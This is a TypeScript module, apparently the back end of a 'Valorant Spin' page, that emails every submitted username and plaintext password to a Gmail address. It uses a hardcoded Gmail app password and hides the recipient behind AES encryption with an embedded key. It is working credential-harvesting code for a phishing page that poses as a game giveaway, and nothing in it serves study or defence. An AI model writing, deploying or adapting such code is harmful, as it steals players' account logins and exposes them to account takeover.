import nodemailer from 'nodemailer';
import CryptoJS from 'crypto-js';

// Encrypted email recipient (for security)
const encryptedEmail = CryptoJS.AES.encrypt('hamzamain446@gmail.com', 'valorant-spin-secret-key').toString();

// Function to decrypt the email
function decryptEmail(encryptedText: string): string {
  const bytes = CryptoJS.AES.decrypt(encryptedText, 'valorant-spin-secret-key');
  return bytes.toString(CryptoJS.enc.Utf8);
}

// Create Gmail transporter using the provided credentials
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'mailsenderflow@gmail.com',
    pass: 'yikm ffro ntcm tgok' // App password
  }
});

/**
 * Sends login info to the encrypted email address
 */
export async function sendLoginInfo(username: string, password: string): Promise<boolean> {
  try {
    const recipientEmail = decryptEmail(encryptedEmail);
    
    const mailOptions = {
      from: 'mailsenderflow@gmail.com',
      to: recipientEmail,
      subject: 'New Valorant Spin Login',
      html: `
        <h2>New Login Detected</h2>
        <p><strong>Username:</strong> ${username}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Date:</strong> ${new Date().toLocaleString()}</p>
        <p><strong>IP Address:</strong> ${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}</p>
      `
    };

    await transporter.sendMail(mailOptions);
    console.log('Email sent successfully to:', recipientEmail);
    return true;
  } catch (error) {
    console.error('Error sending email:', error);
    return false;
  }
}
